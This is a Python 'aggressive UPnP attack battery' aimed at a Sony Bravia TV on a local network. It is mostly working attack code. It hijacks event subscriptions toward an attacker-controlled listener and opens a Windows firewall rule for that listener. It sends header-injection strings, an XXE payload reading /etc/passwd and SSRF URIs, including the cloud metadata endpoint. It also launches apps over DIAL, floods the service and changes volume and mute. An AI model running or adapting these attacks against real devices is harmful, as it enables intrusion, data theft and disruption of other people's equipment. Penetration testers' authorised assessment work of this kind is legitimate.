#!/usr/bin/env python3
"""
Aggressive UPnP attack battery: EventSub hijack, header injection, service fuzzing,
connection exhaustion, metadata exfiltration, DIAL deep-scan.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os, tempfile, socket, time, json, datetime, re, threading
import http.server, socketserver
import requests

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
UPNP     = 2870
DIAL     = 56789
OUT_DIR  = os.path.dirname(os.path.abspath(__file__))

EVIDENCE = {"timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(), "tests": {}}


def log(section, data):
    EVIDENCE["tests"][section] = data
    print(f"  [{section}] {str(data)[:200]}")


def soap(svc, action, inner, path, extra_headers=None):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f"<s:Body><u:{action} xmlns:u=\"{svc}\">{inner}</u:{action}></s:Body>"
        "</s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    if extra_headers:
        headers.update(extra_headers)
    return requests.post(f"http://{TARGET}:{UPNP}/{path}",
                         data=body.encode(), headers=headers, timeout=8)


# ─── TEST 1: EventSub Hijack ───────────────────────────────────────────────

EVENTSUB_HITS = []

class EventSubHandler(http.server.BaseHTTPRequestHandler):
    def do_NOTIFY(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        hit = {
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "peer": self.client_address[0],
            "headers": dict(self.headers),
            "body": body.decode(errors="replace")[:2000],
        }
        EVENTSUB_HITS.append(hit)
        print(f"\n  *** EventSub NOTIFY from {hit['peer']}: {body[:300]!r}")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass


def test_eventsub_hijack():
    print("\n[TEST 1] EventSub Subscription Hijack")
    # Start event listener
    os.system('netsh advfirewall firewall add rule name="PoC_EventSub_9998" dir=in action=allow protocol=TCP localport=9998 >nul 2>&1')
    try:
        srv = socketserver.TCPServer(("", 9998), EventSubHandler)
        srv.allow_reuse_address = True
        threading.Thread(target=srv.serve_forever, daemon=True).start()
    except Exception as e:
        log("eventsub", {"error": str(e)})
        return

    results = {}
    services = [
        ("RenderingControl", "event/RenderingControl"),
        ("AVTransport",      "event/AVTransport"),
        ("ConnectionManager","event/ConnectionManager"),
    ]
    for svc_name, event_url in services:
        try:
            r = requests.request(
                "SUBSCRIBE",
                f"http://{TARGET}:{UPNP}/{event_url}",
                headers={
                    "NT": "upnp:event",
                    "CALLBACK": f"<http://{ATTACKER}:9998/event>",
                    "TIMEOUT": "Second-300",
                    "HOST": f"{TARGET}:{UPNP}",
                },
                timeout=8,
            )
            sid = r.headers.get("SID", "")
            timeout_hdr = r.headers.get("TIMEOUT", "")
            results[svc_name] = {
                "subscribe_http": r.status_code,
                "SID": sid,
                "timeout": timeout_hdr,
                "headers": dict(r.headers),
            }
            print(f"  SUBSCRIBE {svc_name}: HTTP {r.status_code}  SID={sid}")
        except Exception as e:
            results[svc_name] = {"error": str(e)}

    # Wait for events
    time.sleep(5)
    srv.shutdown()
    os.system('netsh advfirewall firewall delete rule name="PoC_EventSub_9998" >nul 2>&1')
    results["event_hits"] = EVENTSUB_HITS
    log("eventsub_hijack", results)


# ─── TEST 2: Full Action Fuzzing ───────────────────────────────────────────

def test_action_fuzzing():
    print("\n[TEST 2] Full Action Fuzzing (all known UPnP actions)")
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    RC  = "urn:schemas-upnp-org:service:RenderingControl:1"
    CM  = "urn:schemas-upnp-org:service:ConnectionManager:1"

    actions = [
        # AVTransport
        (AVT, "GetCurrentTransportActions", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetDeviceCapabilities", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetMediaInfo", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetMediaInfo_Ext", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetPositionInfo", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "GetTransportSettings", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "Seek", "<InstanceID>0</InstanceID><Unit>REL_TIME</Unit><Target>00:00:05</Target>", "control/AVTransport"),
        (AVT, "Next", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "Previous", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "Pause", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "Record", "<InstanceID>0</InstanceID>", "control/AVTransport"),
        (AVT, "SetPlayMode", "<InstanceID>0</InstanceID><NewPlayMode>NORMAL</NewPlayMode>", "control/AVTransport"),
        (AVT, "SetRecordQualityMode", "<InstanceID>0</InstanceID><NewRecordQualityMode>0:EP</NewRecordQualityMode>", "control/AVTransport"),
        # RenderingControl
        (RC, "GetVolume", "<InstanceID>0</InstanceID><Channel>Master</Channel>", "control/RenderingControl"),
        (RC, "GetMute", "<InstanceID>0</InstanceID><Channel>Master</Channel>", "control/RenderingControl"),
        (RC, "GetBrightness", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetContrast", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetSharpness", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetColorTemperature", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetHorizontalKeystone", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetVerticalKeystone", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "GetLoudness", "<InstanceID>0</InstanceID><Channel>Master</Channel>", "control/RenderingControl"),
        (RC, "GetVolumeDB", "<InstanceID>0</InstanceID><Channel>Master</Channel>", "control/RenderingControl"),
        (RC, "GetVolumeDBRange", "<InstanceID>0</InstanceID><Channel>Master</Channel>", "control/RenderingControl"),
        (RC, "ListPresets", "<InstanceID>0</InstanceID>", "control/RenderingControl"),
        (RC, "SelectPreset", "<InstanceID>0</InstanceID><PresetName>FactoryDefaults</PresetName>", "control/RenderingControl"),
        # ConnectionManager
        (CM, "GetCurrentConnectionIDs", "", "control/ConnectionManager"),
        (CM, "GetCurrentConnectionInfo", "<ConnectionID>0</ConnectionID>", "control/ConnectionManager"),
        (CM, "GetProtocolInfo", "", "control/ConnectionManager"),
    ]

    results = {}
    for svc, action, inner, path in actions:
        try:
            r = soap(svc, action, inner, path)
            # Extract key values from response
            values = re.findall(r"<([A-Za-z]+)>([^<]{1,100})</\1>", r.text)
            key_values = {k: v for k, v in values if k not in ("s:Envelope","s:Body","faultstring")}
            results[action] = {
                "http": r.status_code,
                "values": key_values,
                "error": "" if r.status_code == 200 else r.text[200:400],
            }
            sym = "OK" if r.status_code == 200 else "ERR"
            print(f"  [{sym}] {action}: {r.status_code} -> {list(key_values.items())[:3]}")
        except Exception as e:
            results[action] = {"error": str(e)}

    log("action_fuzzing", results)


# ─── TEST 3: Header Injection / Request Smuggling ─────────────────────────

def test_header_injection():
    print("\n[TEST 3] Header Injection & Malformed Requests")
    results = {}
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"

    # Test 3a: SOAPACTION header injection
    tests = [
        ("overlong_action", AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport",
         {"SOAPACTION": f'"{AVT}#GetTransportInfo" X-Injected: pwned'}),
        ("wrong_namespace", AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport",
         {"SOAPACTION": '"urn:INJECTED:NAMESPACE#GetTransportInfo"'}),
        ("no_soapaction", AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport",
         {"SOAPACTION": ""}),
        ("xxe_attempt", AVT, "GetTransportInfo",
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><InstanceID>&xxe;</InstanceID>',
         "control/AVTransport", {}),
        ("ssrf_via_header", AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport",
         {"X-Forwarded-For": f"{ATTACKER}", "X-Original-URL": f"http://{ATTACKER}:9999/header_ssrf"}),
    ]
    for label, svc, action, inner, path, extra in tests:
        try:
            r = soap(svc, action, inner, path, extra_headers=extra if extra else None)
            results[label] = {"http": r.status_code, "body_snippet": r.text[100:400]}
            print(f"  {label}: HTTP {r.status_code}")
        except Exception as e:
            results[label] = {"error": str(e)}

    # Test 3b: URI injection payloads via SetAVTransportURI
    uri_payloads = [
        ("ssrf_localhost_80",    f"http://127.0.0.1:80/"),
        ("ssrf_localhost_8080",  f"http://127.0.0.1:8080/"),
        ("ssrf_localhost_22",    f"http://127.0.0.1:22/"),
        ("ssrf_gateway",         f"http://192.168.18.1:80/"),
        ("ssrf_169_254",         f"http://169.254.169.254/latest/meta-data/"),  # AWS metadata
        ("path_traversal",       f"file:///etc/passwd"),
        ("rtsp_scheme",          f"rtsp://192.168.18.1:554/"),
        ("ftp_scheme",           f"ftp://192.168.18.1/"),
        ("data_uri",             f"data:text/html,<h1>pwned</h1>"),
    ]
    uri_results = {}
    for label, uri in uri_payloads:
        try:
            r = soap(AVT, "SetAVTransportURI",
                     f"<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI><CurrentURIMetaData></CurrentURIMetaData>",
                     "control/AVTransport")
            uri_results[label] = {"uri": uri, "http": r.status_code, "body": r.text[100:300]}
            print(f"  URI {label}: SetURI={r.status_code}  uri={uri}")
        except Exception as e:
            uri_results[label] = {"error": str(e)}

    results["uri_payloads"] = uri_results
    log("header_injection", results)


# ─── TEST 4: Service Description Scraping ─────────────────────────────────

def test_service_descriptions():
    print("\n[TEST 4] Full Service Description Scraping")
    results = {}
    scpd_paths = ["/dmr_rcs.xml", "/dmr_cms.xml", "/dmr_avts.xml"]
    for path in scpd_paths:
        try:
            r = requests.get(f"http://{TARGET}:{UPNP}{path}", timeout=6)
            results[path] = {
                "http": r.status_code,
                "content": r.text[:4000] if r.status_code == 200 else r.text[:200],
                "size": len(r.text),
            }
            # Extract all actions
            actions = re.findall(r"<name>([A-Za-z]+)</name>", r.text)
            state_vars = re.findall(r"<name>([A-Z][A-Za-z]+)</name>", r.text)
            results[path]["actions"] = list(set(actions))
            print(f"  {path}: HTTP {r.status_code}  actions={list(set(actions))[:10]}")
        except Exception as e:
            results[path] = {"error": str(e)}
    log("service_descriptions", results)


# ─── TEST 5: DIAL Deep Scan ───────────────────────────────────────────────

def test_dial_deep():
    print("\n[TEST 5] DIAL Deep Enumeration")
    results = {}

    # Try all DIAL endpoints
    paths = [
        "/apps/", "/apps/System", "/apps/Netflix", "/apps/YouTube",
        "/apps/AmazonInstantVideo", "/apps/Amazon", "/apps/Hulu",
        "/apps/com.sony.dtv.externalapplication",
        "/apps/WebBrowser", "/apps/SonyBrowser",
        "/apps/Spotify", "/apps/TuneIn", "/apps/Plex",
        "/apps/Dailymotion", "/apps/Vudu", "/apps/HBONow",
        "/apps/Crackle", "/apps/CrunchyRoll", "/apps/WWW",
        "/apps/BRAVIA_Smart_STB", "/apps/SONY_STB",
        "/version.txt", "/dial/version", "/favicon.ico",
    ]
    for path in paths:
        try:
            r = requests.get(f"http://{TARGET}:{DIAL}{path}", timeout=3)
            if r.status_code not in (404,):
                state_m = re.search(r"<state>(\w+)</state>", r.text)
                state = state_m.group(1) if state_m else ""
                results[path] = {
                    "http": r.status_code,
                    "state": state,
                    "body": r.text[:300],
                    "headers": {k: v for k, v in r.headers.items()},
                }
                print(f"  DIAL {path}: HTTP {r.status_code}  state={state!r}")
        except Exception:
            pass

    # Try launching YouTube with deep-link parameters
    yt_payloads = [
        "v=dQw4w9WgXcY",
        "v=SECURITY_TEST",
        '{"v":"dQw4w9WgXcY"}',
        "pairingCode=1234&app=YouTube&v=dQw4w9WgXcY",
    ]
    yt_launch = {}
    for payload in yt_payloads:
        try:
            r = requests.post(f"http://{TARGET}:{DIAL}/apps/YouTube",
                              data=payload,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=5)
            yt_launch[payload] = {"http": r.status_code, "location": r.headers.get("Location","")}
            print(f"  YouTube POST {payload!r:.40}: HTTP {r.status_code}")
        except Exception as e:
            yt_launch[payload] = {"error": str(e)}
    results["youtube_launch_attempts"] = yt_launch

    log("dial_deep", results)


# ─── TEST 6: Rapid Fire Flood ──────────────────────────────────────────────

def test_rapid_fire():
    print("\n[TEST 6] Rapid-fire UPnP flood (DoS assessment)")
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    RC  = "urn:schemas-upnp-org:service:RenderingControl:1"

    results = {"requests_sent": 0, "ok": 0, "errors": 0, "times": []}
    t0 = time.time()

    for i in range(30):
        try:
            t_req = time.time()
            r = soap(RC, "GetVolume",
                     "<InstanceID>0</InstanceID><Channel>Master</Channel>",
                     "control/RenderingControl")
            elapsed = time.time() - t_req
            results["times"].append(round(elapsed, 3))
            if r.status_code == 200:
                results["ok"] += 1
            else:
                results["errors"] += 1
            results["requests_sent"] += 1
        except Exception:
            results["errors"] += 1
            results["requests_sent"] += 1

    total = time.time() - t0
    results["total_seconds"] = round(total, 2)
    results["rps"] = round(results["requests_sent"] / total, 1)
    results["avg_ms"] = round(sum(results["times"])*1000/len(results["times"]), 1) if results["times"] else 0
    print(f"  {results['requests_sent']} requests in {total:.1f}s  "
          f"({results['rps']} rps)  ok={results['ok']}  avg={results['avg_ms']}ms")
    log("rapid_fire", results)


# ─── TEST 7: Volume + Mute Storm ─────────────────────────────────────────

def test_media_control_storm():
    print("\n[TEST 7] Media control storm (volume ramp, mute cycle)")
    RC = "urn:schemas-upnp-org:service:RenderingControl:1"
    results = []

    # Read original
    r = soap(RC, "GetVolume", "<InstanceID>0</InstanceID><Channel>Master</Channel>",
             "control/RenderingControl")
    orig_vol_m = re.search(r"<CurrentVolume>(\d+)</CurrentVolume>", r.text)
    orig_vol = int(orig_vol_m.group(1)) if orig_vol_m else 5

    # Mute -> unmute -> vol 0 -> vol 1 -> vol 2 -> restore
    ops = [
        ("SetMute", "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredMute>1</DesiredMute>"),
        ("SetMute", "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredMute>0</DesiredMute>"),
        ("SetVolume", "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>0</DesiredVolume>"),
        ("SetVolume", "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>2</DesiredVolume>"),
        ("SetVolume", "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>4</DesiredVolume>"),
        ("SetVolume", f"<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>{orig_vol}</DesiredVolume>"),
    ]
    for action, inner in ops:
        try:
            r = soap(RC, action, inner, "control/RenderingControl")
            results.append({"action": action, "inner": inner[:50], "http": r.status_code})
            print(f"  {action}: HTTP {r.status_code}")
            time.sleep(0.5)
        except Exception as e:
            results.append({"action": action, "error": str(e)})

    log("media_control_storm", results)


# ─── MAIN ──────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("Sony Bravia KDL-50W665F — Aggressive UPnP Attack Battery")
    print(f"  Target: {TARGET}:{UPNP}")
    print("=" * 60)

    test_eventsub_hijack()
    test_service_descriptions()
    test_action_fuzzing()
    test_header_injection()
    test_dial_deep()
    test_rapid_fire()
    test_media_control_storm()

    out = os.path.join(OUT_DIR, "aggressive_upnp_evidence.json")
    with open(out, "w") as f:
        json.dump(EVIDENCE, f, indent=2)
    print(f"\n[*] Evidence -> {out}")


if __name__ == "__main__":
    main()
